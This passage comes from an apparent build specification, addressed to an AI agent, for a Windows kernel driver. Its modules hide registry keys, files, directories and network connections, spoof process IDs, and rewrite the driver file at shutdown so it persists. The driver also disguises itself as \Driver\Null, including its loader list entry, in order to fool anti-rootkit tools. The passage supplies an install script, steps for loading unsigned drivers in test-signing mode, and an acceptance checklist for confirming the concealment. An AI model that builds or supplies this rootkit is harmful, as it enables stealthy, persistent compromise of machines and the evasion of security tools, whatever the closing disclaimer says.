| `HKEY_LOCAL_MACHINE\` / `HKLM\` | `\Registry\Machine\` | After the prefix; if it starts with `\` skip one `\` |
| `HKEY_CURRENT_USER\` / `HKCU\` | `\Registry\User\` | Same |
| `HKEY_CLASSES_ROOT\` / `HKCR\` | `\Registry\Machine\SOFTWARE\Classes\` | Same |
| Starts with `\` | Empty (as-is) | Entire string |
| `Registry\` | `\` | Entire string |

**RegHide_AddKey canonical-path resolution**:

1. `ConvertToKernelPath` to kernel format
2. `SetReentrantThread` + `ZwOpenKey` + `ObReferenceObjectByHandle`
3. `ObQueryNameString` (`GetKeyFullPath`) to obtain the canonical full path (resolves CurrentControlSet and other symbolic links)
4. **Write both into the temporary list** (not either-or): the canonical path (if different from `kernelPath`) **and** the original `kernelPath` (so PreOpen can match unresolved paths)
5. Dedup the temporary list (`_wcsicmp`), cap at `REGHIDE_MAX_ENTRIES`
6. `EndUpdate`: `RtlCopyMemory` whole-table replace of the active list, update `g_HideCount`

---

## 10. Submodule F: Driver-File Write-Back (WriteBack.c)

### 10.1 Initialization

```
GetDriverFilePath(DriverObject):
    Deep-copy FullDllName from DriverObject->DriverSection into NonPagedPool
    /* When reading only FullDllName/DllBase, share the same KLDR_DATA_TABLE_ENTRY
     * as §11.3. Do not write a second InMemoryOrderLinks layout, which would
     * copy x86/x64 offsets incorrectly. */

CacheDriverFile(path):
    ZwCreateFile READ → FileStandardInformation
    Reject >4GB or size==0 or size>16MB
    Allocate NonPagedPool → ZwReadFile, verify iosb.Information == fileSize

RegisterPowerCallback:
    ExCreateCallback(\Callback\PowerState, Create=FALSE, AllowMultiple=TRUE)
    + ExRegisterCallback
    Write back only when (ULONG_PTR)pArgument1 == PO_CB_SYSTEM_STATE_LOCK (value 3)
    AND (ULONG_PTR)pArgument2 == 0 (about to hibernate/sleep)
    Power-callback registration failure is non-fatal

IoCreateDevice(L"\\Device\\<Name>WriteBack", FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, Exclusive=FALSE)
    — no symbolic link; used only to receive shutdown IRPs
IoRegisterShutdownNotification(device)
DriverObject->MajorFunction[IRP_MJ_SHUTDOWN] = ShutdownDispatch
    /* Save the original pointer g_OldShutdown before install; write it back
     * on Cleanup; if the original was NULL, set NULL */
```

### 10.2 Triggering Write-Back

| Event | Action |
|------|------|
| IRP_MJ_SHUTDOWN | WritebackDriverFile() |
| PowerCallback (hibernate/sleep) | WritebackDriverFile() |
| InterlockedCompareExchange(&g_WritebackInProgress) to prevent reentrancy |
| IRQL MUST be PASSIVE_LEVEL, otherwise skip |

```
WritebackDriverFile():
    ZwCreateFile(path, GENERIC_WRITE, FILE_OVERWRITE_IF) → ZwWriteFile(cached_data, cached_size)
```

Cleanup order: UnregisterPowerCallback → IoUnregisterShutdownNotification → restore `MajorFunction[IRP_MJ_SHUTDOWN]` → IoDeleteDevice → FreeDriverCache

The shutdown dispatch MUST NOT call the previous `IRP_MJ_SHUTDOWN` handler. Save/restore the pointer only so Cleanup can put `DriverObject` back.

---

## 11. Submodule G: DriverObject Clone Spoofing (DriverObjectSpoof.c)

### 11.1 Undocumented API Declarations

```c
extern POBJECT_TYPE *IoDriverObjectType;

NTKERNELAPI NTSTATUS ObReferenceObjectByName(
    __in      PUNICODE_STRING ObjectName,
    __in      ULONG           Attributes,          /* typically OBJ_CASE_INSENSITIVE */
    __in_opt  PACCESS_STATE   AccessState,         /* pass NULL */
    __in_opt  ACCESS_MASK     DesiredAccess,       /* pass 0 */
    __in      POBJECT_TYPE    ObjectType,          /* *IoDriverObjectType */
    __in      KPROCESSOR_MODE AccessMode,          /* KernelMode */
    __inout_opt PVOID         ParseContext,        /* pass NULL */
    __out     PVOID          *Object);
```

NetHide and Spoof **share** this declaration (place it in `Driver.h` or a standalone `Undoc.h`); do not write two copies with inconsistent parameter types.

### 11.2 SPOOF_CONFIG and SPOOF_BACKUP

```c
typedef struct {
    UNICODE_STRING TargetDriverName;  /* L"\\Driver\\Null" */
    BOOLEAN SpoofDriverName;
    BOOLEAN SpoofDriverStart;
    BOOLEAN SpoofDriverSize;
    BOOLEAN SpoofDriverSection;
    BOOLEAN SpoofDriverInit;
    BOOLEAN SpoofLdrEntry;   /* Critical: deceive tools that walk PsLoadedModuleList such as ARK/PCHunter */
} SPOOF_CONFIG;

typedef struct {
    BOOLEAN IsActive;
    UNICODE_STRING OriginalDriverNameRaw;  /* Contains the I/O manager's original Buffer pointer, used for restore */
    WCHAR OriginalNameBuffer[256];         /* Deep copy, debug-only */
    PVOID OriginalDriverStart;
    ULONG OriginalDriverSize;
    PVOID OriginalDriverSection;
    PDRIVER_INITIALIZE OriginalDriverInit;
    /* LDR node backup (when SpoofLdrEntry is enabled) */
    BOOLEAN LdrSpoofActive;
    PVOID OriginalLdrDllBase;
    ULONG OriginalLdrSizeOfImage;
    PVOID OriginalLdrEntryPoint;
    UNICODE_STRING OriginalLdrFullDllName;
    UNICODE_STRING OriginalLdrBaseDllName;
    PDRIVER_OBJECT TargetDriverObject;     /* Keep a reference to prevent dangling */
} SPOOF_BACKUP;
```

In `DriverEntry`, all Spoof* flags are set TRUE (except in debug mode).

### 11.3 KLDR_DATA_TABLE_ENTRY (MUST write every field; `...` is FORBIDDEN)

`DriverSection` points at this structure. Intermediate fields are placeholders; **`DllBase` MUST NOT sit immediately after `InLoadOrderLinks`**, or the FullDllName offset will be entirely wrong and both write-back paths and LDR spoofing will write off into the weeds.

```c
typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;   /* MUST NEVER modify the list pointers */
    PVOID      ExceptionTable;
    ULONG      ExceptionTableSize;
    PVOID      GpValue;
    PVOID      NonPagedDebugInfo;
    PVOID      DllBase;            /* x64 +0x030 / x86 +0x018 */
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;    /* x64 +0x048 / x86 +0x024 */
    UNICODE_STRING BaseDllName;    /* x64 +0x058 / x86 +0x02C */
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;
```

On Win7 SP1 through Win11 24H2 the layout through BaseDllName is stable. Subsequent Flags/LoadCount MAY be omitted.

### 11.4 Spoof Flow

1. `ObReferenceObjectByName` to obtain the target `\Driver\Null` `DRIVER_OBJECT`
2. Back up all of this driver's `_DRIVER_OBJECT` fields that will be changed + a dual backup of DriverName
3. If `SpoofLdrEntry`: **before SpoofDriverSection**, modify this driver's own LDR node (via `SelfDriverObject->DriverSection`) DllBase/EntryPoint/SizeOfImage/FullDllName/BaseDllName to the target values
4. Per Config, overwrite DriverName/DriverStart/DriverSize/DriverSection/DriverInit
5. Keep the TargetDriverObject reference until Restore

**MUST NEVER modify**: `MajorFunction[]`, the `DeviceObject` chain, `DriverUnload`, `DriverExtension`, `InLoadOrderLinks`

### 11.5 Restore Flow (first step of DriverUnload)

1. If `LdrSpoofActive`: locate **this driver's** LDR node via `Backup->OriginalDriverSection` and restore LDR fields
2. `DriverName = OriginalDriverNameRaw` (MUST use the original Buffer pointer; a stack deep-copy MUST NOT be used)
3. Restore DriverStart/Size/Section/Init
4. `ObDereferenceObject(TargetDriverObject)`

If `Backup->IsActive` on a repeated Spoof, return `STATUS_ALREADY_REGISTERED`.

---

## 12. Deployment Script Template (the Agent MUST generate Install.bat)

```bat
set SERVICE_NAME=<ServiceName>
set DRIVER_PATH=%~dp0<DriverName>.sys

sc create %SERVICE_NAME% type= filesys start= demand binPath= "%DRIVER_PATH%"

reg add "HKLM\SYSTEM\CurrentControlSet\Services\%SERVICE_NAME%\Instances" /v DefaultInstance /t REG_SZ /d "<ServiceName> Instance" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%SERVICE_NAME%\Instances\<ServiceName> Instance" /v Altitude /t REG_SZ /d "370030" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\%SERVICE_NAME%\Instances\<ServiceName> Instance" /v Flags /t REG_DWORD /d 0 /f

set CONFIG=HKLM\SYSTEM\CurrentControlSet\Services\%SERVICE_NAME%\Config
reg add "%CONFIG%" /v Process /t REG_SZ /d "notepad.exe;test.exe" /f
reg add "%CONFIG%" /v IP      /t REG_SZ /d "192.168.1.100" /f
reg add "%CONFIG%" /v Port    /t REG_SZ /d "8080;3389" /f
reg add "%CONFIG%" /v Path    /t REG_SZ /d "C:\hidden_folder" /f
reg add "%CONFIG%" /v RegPath /t REG_SZ /d "HKLM\SOFTWARE\HiddenKey" /f

sc start %SERVICE_NAME%
```

> Loading an unsigned driver on 64-bit Windows requires test-signing mode (`bcdedit /set testsigning on`) or disabling driver signature enforcement.

---

## 13. Project Configuration Essentials (vcxproj) — required to link a .sys

| Item | Value |
|----|-----|
| ToolsVersion | 4.0; PlatformToolset `v100` |
| ConfigurationType | `DynamicLibrary`, `TargetExt=.sys` |
| Platforms | Debug/Release × Win32/x64, 4 configurations in total |
| WDKDir | e.g. `C:\WinDDK\7600.16385.1\` (trailing backslash) |
| Include | `$(WDKDir)inc\ddk;inc\api;inc\crt`; `IgnoreStandardIncludePath=true` |
| Preprocessor | `_WIN32_WINNT=0x0601;WINVER=0x0601;NTDDI_VERSION=0x06010000;ALLOC_PRAGMA`; Debug adds `DBG=1`; x64 adds `_AMD64_=1;AMD64=1`; x86 adds `_X86_=1;i386=1;STD_CALL` |
| Compile | No exceptions / no RTTI / `BufferSecurityCheck=false` / `OmitDefaultLibName=true` / `StructMemberAlignment=8Bytes`; x86 `CallingConvention=StdCall` |
| Link | `SubSystem=Native`; `IgnoreAllDefaultLibraries=true`; `/DRIVER /SECTION:INIT,d /MERGE:.rdata=.text`; disable incremental linking; clear ASLR/DEP so they do not conflict with `/DRIVER` |
| Entry point | x64: `DriverEntry`; x86: `DriverEntry@8` |
| Link libraries | `ntoskrnl.lib;hal.lib;wdm.lib;bufferoverflowK.lib;fltMgr.lib` (lib dir `$(WDKDir)lib\win7\amd64` or `i386`) |
| PathHide | `#include <fltKernel.h>`, independent pool tag |
| SAL | 1.0 (`__in`, `__out`, `__checkReturn`, etc.) |
| vcxproj skeleton | `ToolsVersion=4.0`; first `Microsoft.Cpp.Default.props` then set ConfigurationType, then `Microsoft.Cpp.props`; four `ItemDefinitionGroup`s MAY be split by Configuration\|Platform, but **x64/Win32 EntryPoint, lib directories, and preprocessor MUST be split by platform**; `TargetExt=.sys` goes in a PropertyGroup; sources use `<ClCompile Include="*.c"/>`; finally `Microsoft.Cpp.targets` |
| ALLOC_PRAGMA | INIT: DriverEntry/Init*; PAGE: Cleanup/polling; MiniFilter callbacks and NetHide completion routines/DeviceControl Hook are **non-paged** |
| Compile warnings | Suppress 4100/4127/4201/4214; PathHide suppresses prefast function-pointer warnings |
| PostBuild | `signtool sign /v /s PrivateCertStore /n "<CertName>" /fd sha1 "$(TargetPath)"` |

**Test-certificate script** (`tools/CreateTestCert.cmd`, run once as Administrator):

1. `makecert -r -pe -ss PrivateCertStore -n "CN=<CertName>" <file>.cer`
2. `certmgr -add` into `localMachine\Root` and `localMachine\TrustedPublisher`
3. On the target machine `bcdedit /set testsigning on` then reboot

---

## 14. Thread-Safety Summary

| Module | Synchronization |
|------|----------|
| PidSpoof | FAST_MUTEX |
| NetHide rule list | KSPIN_LOCK (readable at DISPATCH_LEVEL from the completion routine) |
| PathHide hide list | ERESOURCE (shared read / exclusive write) |
| RegHide hide list | FAST_MUTEX |
| RegConfig polling | KEVENT stop signal + single thread |
| WriteBack | InterlockedCompareExchange to prevent reentrant write |

---

## 15. Acceptance Checklist

- [ ] VS2010 + WDK7600 compiles Win32/x64 with no errors
- [ ] `sc create/start` loads successfully
- [ ] After configuring Process rules, every same-named target process `UniqueProcessId` becomes 4; after changing the Process value, old PIDs restore within 5 seconds
- [ ] After configuring Port / remote IP, `netstat` does not show the corresponding TCP connections on x64 **and** x86
- [ ] After configuring a directory Path, that directory and its children cannot be opened, and they do not appear in parent-directory enumeration
- [ ] MiniFilter still registers when `sc create` uses an arbitrary service name (the Instances key follows the service name)
- [ ] After configuring Path rules, `dir` does not show the target directory/file
- [ ] After configuring RegPath rules, regedit cannot open that key or its subkeys, and the key does not appear in parent-key enumeration
- [ ] Changing Config registry values takes effect in ≤5 seconds (no driver restart)
- [ ] After shutdown the driver `.sys` file still exists (Writeback)
- [ ] `sc stop` unloads cleanly with no BSOD
- [ ] When `DEBUG_SKIP_SPOOF=0`, WinDbg `!drvobj` shows the spoofed driver name

---

## 16. Disclaimer (MUST be included in the README)

> This project is a learning artifact of Windows kernel-driver programming. It is limited to testing in virtual machines / authorized lab environments and MUST NOT be used for illegal purposes.
